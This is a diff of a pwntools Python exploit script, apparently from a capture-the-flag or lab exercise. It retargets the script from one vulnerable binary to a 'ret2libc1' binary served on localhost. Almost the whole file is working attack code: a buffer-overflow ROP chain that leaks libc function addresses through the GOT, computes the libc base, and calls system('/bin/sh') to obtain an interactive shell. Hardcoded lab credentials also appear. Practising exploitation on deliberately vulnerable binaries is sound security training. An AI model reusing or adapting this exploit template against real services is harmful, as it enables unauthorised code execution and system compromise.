@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template --host localhost --port 14003 --libc ../../libc.so.6 ../src/overflow1
+# $ pwn template --host localhost --port 14005 --libc ../../libc.so.6 ../src/ret2libc1.debug
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or "../src/overflow1.debug")
-context.terminal = ["alacritty", "-e"]
+exe = context.binary = ELF(args.EXE or "../src/ret2libc1.debug")
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -14,7 +13,7 @@ context.terminal = ["alacritty", "-e"]
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
 host = args.HOST or "localhost"
-port = int(args.PORT or 14003)
+port = int(args.PORT or 14005)
 libc = ELF("../../libc.so.6")
 
 
@@ -47,7 +46,6 @@ def start(argv=[], *a, **kw):
 # ./exploit.py GDB
 gdbscript = """
 tbreak main
-b *main+345
 continue
 """.format(
     **locals()
@@ -60,111 +58,75 @@ continue
 # RELRO:      Full RELRO
 # Stack:      Canary found
 # NX:         NX enabled
-# PIE:        PIE enabled
+# PIE:        no pie
 # Stripped:   No
 # Debuginfo:  Yes
 
-# creds
-login_user = "cors33"
-login_code = "aW5ub2NlbnQ="
+usr = "j@k3th3gr3@t"
+pwd = "inn0c3nc3"
 
 
-def leave_prog(io: connect | process):
-    # assumes starting from "> "
-    io.sendline(b"4")
-
-
-def change_username(io: connect | process, payload: bytes):
-    # assumes starting from "> "
-    io.sendline(b"1")
-    io.recvuntil(b"name: ")
-    io.sendline(payload)
-    io.recvuntil(b"> ")
-
-
-def login(io: process | connect, username=login_user, password=login_code):
-    # login
-    io.recvuntil(b"name: ")
-    io.sendline(username.encode("ascii"))
-    io.recvuntil(b"code: ")
-    io.sendline(password.encode("ascii"))
-    io.recvuntil(b"> ")
+def send_payload(
+    _io: process | connect,
+    payload: bytes,
+    _usr: str = usr,
+    _pwd: str = pwd,
+    get: bool = True,
+) -> bytes:
+    _io.recvuntil(b"name: ")
+    _io.sendline(_usr.encode("ascii"))
+    _io.recvuntil(b"word: ")
+    _io.sendline(_pwd.encode("ascii") + b"A" * (32 - len(_pwd)) + payload)
+    _io.recvuntil(b"\n")
+    ret = b""
+    if get:
+        return _io.recvuntil(b"\n", drop=True)
+    return ret
 
 
 def exploit() -> bool:
     io = start()
 
-    # logging
-    io.info("Getting the host flag via. buffer overflow.")
+    io.recvuntil(b"-- j@k3")
 
-    # from the binary
-    payload_size = 88 + 0x20
-
-    # function imports
-    syms = ["puts", "printf", "exit", "fgets"]
+    # start rop chain
+    syms = ["puts", "printf", "read", "strncmp", "exit"]
     addrs = {}
 
-    # creating a rop chain
-    rop = ROP(exe)
     for sym in syms:
-        # logging in
-        login(io)
-
-        # rop chain
+        # chain
         rop = ROP(exe)
         rop.puts(exe.got[sym])
         rop.main()
 
         # payload
-        payload = b"A" * payload_size
+        payload = b"A" * 8
         payload += rop.chain()
 
-        # sending it
-        io.debug(f"Leaking function addresses.")
-        io.debug(rop.dump())
-        change_username(io, payload)
+        # sending
+        io.debug(f"Sending payload: {payload}")
+        addrs[sym] = unpack(send_payload(io, payload).ljust(8, b"\0"))
 
-        # activating the rop chain
-        leave_prog(io)
+        # logging
+        io.info(f"Leaked address of {sym}@libc: {hex(addrs[sym])}")
 
-        # getting address
-        addrs[sym] = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b"\0"))
-        io.info(f"Leaked address of {sym}@libc: {hex(addrs[sym])}.")
-
-    # asserting libc addresses
+    # confirming libc
     libc.address = addrs[syms[0]] - libc.sym[syms[0]]
     assert libc.address & 0xFFF == 0
     for sym in syms:
         io.debug(f"{sym}: {hex(libc.sym[sym])}@libc, {hex(addrs[sym])}@leak")
         # assert libc.sym[sym] == addrs[sym]
 
-    # forming ret2libc
-    login(io)
-
-    # exploit
+    # getting a shell
     rop = ROP(libc)
     rop.raw(rop.ret)
     rop.system(next(libc.search(b"/bin/sh")))
 
-    # forming the payload
-    payload = b"A" * payload_size
-    payload += rop.chain()
+    # sending payload
+    send_payload(io, (b"A" * 8) + rop.chain(), get=False)
 
-    # sending exploit
-    change_username(io, payload)
-    leave_prog(io)
-
-    # enjoy the shell
-    io.sendline(b"cat flag.root.txt")
-    flag = io.recvuntil(b"\n", drop=True).decode("ascii")
-
-    # comparing to the actual flag
-    with open("./flag.root.txt", "r") as f_in:
-        buf = f_in.readline().strip()
-        if buf in flag:
-            io.success(f"Flag: {flag}")
-            return True
-        return False
+    # enjoy your shell
+    io.interactive()
 
 
 if __name__ == "__main__":
